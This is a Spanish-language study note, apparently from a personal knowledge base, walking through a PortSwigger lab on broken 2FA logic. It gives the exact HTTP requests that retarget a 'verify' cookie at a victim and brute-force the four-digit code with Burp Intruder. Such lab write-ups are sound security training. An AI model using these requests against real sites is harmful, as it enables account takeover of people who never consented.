---
aliases:
  - Authentication 003 - fuerza bruta del código 2FA (lógica rota)
  - 2FA broken logic brute force
tags:
  - vuln/authentication
  - example
  - portswigger
---

# 003 — Fuerza bruta del código 2FA (lógica rota, cookie `verify`)

> Lab: [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic) · **Practitioner** · técnica → [[vulnerabilities/029-authentication/authentication|entry point]]

## ¿Por qué acá? (cuando el 2FA sí se valida)
- **El bypass simple no anda** ([[vulnerabilities/029-authentication/examples/002-2fa-simple-bypass|002]]): el server exige el código. Pero el código es de **4 dígitos** (0000–9999) y **no hay rate limit** que aguante → fuerza bruta.
- **Por qué funciona:** una cookie **`verify=<usuario>`** le dice al server **a quién** generar y validar el código. Podés setear `verify=carlos` **sin conocer su password** → el server manda el código a carlos y lo ata a esa cookie → brute-forceás los 4 dígitos contra su cuenta.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (host, usuario objetivo) + el **payload** (código candidato).

**Paso 1 — apuntar el 2FA a la víctima.** Visitá el flujo de login con tu propia cuenta hasta `/login2`; el server setea la cookie `verify`. Cambiala a la víctima para que **genere el código de carlos**:
<pre class="payload"><code>GET /login2 HTTP/1.1
Host: <mark>LAB.web-security-academy.net</mark>
Cookie: verify=<mark>carlos</mark>; session=&lt;tu sesión&gt;</code></pre>

**Paso 2 — brute-force del código.** Mandá el `POST /login2` a Intruder, `verify=carlos` fijo y `mfa-code` como payload (numbers 0000–9999):
<pre class="payload"><code>POST /login2 HTTP/1.1
Host: <mark>LAB.web-security-academy.net</mark>
Cookie: verify=<mark>carlos</mark>; session=&lt;tu sesión&gt;
Content-Type: application/x-www-form-urlencoded

mfa-code=<mark>§0000§</mark></code></pre>
El código correcto responde **302** hacia `/my-account`; los demás **200**.

## Verificación
El request ganador (302) te deja la sesión de carlos → entrás a `/my-account` → lab resuelto.

## Detalles que se pasan por alto
- **Numbers 0000–9999, padding 4 dígitos** en Intruder (from 0, step 1, min integer digits 4).
- Distinto de [2FA bypass using a brute-force attack](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack): ahí te **desloguean** entre intentos → hace falta **re-login automático** (macro / Turbo Intruder) antes de cada código.
- La clave es la cookie **`verify`**: es el parámetro que "falsea a quién apunta el código". Sin ella, no podés targetear a la víctima.

→ Siguiente: [[vulnerabilities/029-authentication/examples/004-password-reset-logica-rota|004 · sin creds ni 2FA: reset de password con lógica rota]]
